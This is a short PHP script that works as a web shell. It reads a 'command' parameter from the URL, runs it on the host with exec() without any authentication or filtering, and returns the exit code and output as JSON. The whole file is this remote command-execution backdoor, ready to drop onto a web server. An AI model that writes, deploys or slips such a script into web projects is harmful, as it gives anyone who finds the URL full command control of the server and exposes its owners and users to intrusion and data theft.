<?php
set_time_limit(0);

$command = $_GET["command"];
$result_code = 0;
$output;
exec($command, $output, $result_code);

$res = array("return_code" => $result_code, "output" => $output);
echo json_encode($res);
?>